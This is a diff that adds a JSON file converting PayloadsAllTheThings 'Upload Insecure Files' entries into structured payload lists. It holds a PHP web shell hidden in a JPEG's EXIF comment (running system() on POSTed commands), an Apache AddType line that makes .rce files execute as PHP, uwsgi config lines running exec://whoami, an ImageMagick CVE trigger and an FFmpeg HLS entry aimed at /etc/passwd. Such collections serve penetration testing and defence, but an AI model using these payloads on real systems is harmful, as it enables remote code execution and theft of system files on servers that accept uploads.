@@ -1,0 +1,53 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "upload_insecure_files",
+  "original_category": "Upload Insecure Files",
+  "payloads": [
+    {
+      "category": "Picture Metadata",
+      "escalation": "baseline",
+      "lines": [
+        "convert -size 110x110 xc:white payload.jpg",
+        "exiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg",
+        "exiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg"
+      ]
+    },
+    {
+      "category": "Configuration Files",
+      "escalation": "baseline",
+      "lines": [
+        "AddType mime-type extension [extension ...]",
+        "AddType application/x-httpd-php .rce",
+        "[uwsgi]",
+        "; read from a symbol",
+        "foo = @(sym://uwsgi_funny_function)",
+        "; read from binary appended data",
+        "bar = @(data://[REDACTED])",
+        "; read from http",
+        "test = @(http://[REDACTED])",
+        "; read from a file descriptor",
+        "content = @(fd://[REDACTED])",
+        "; read from a process stdout",
+        "body = @(exec://whoami)",
+        "; call a function returning a char *",
+        "characters = @(call://uwsgi_func)"
+      ]
+    },
+    {
+      "category": "CVE - ImageMagick",
+      "escalation": "baseline",
+      "lines": [
+        "convert shellexec.jpeg whatever.gif"
+      ]
+    },
+    {
+      "category": "CVE - FFMpeg HLS",
+      "escalation": "baseline",
+      "lines": [
+        "GOD.txt",
+        "/etc/passwd"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.865Z"
+}
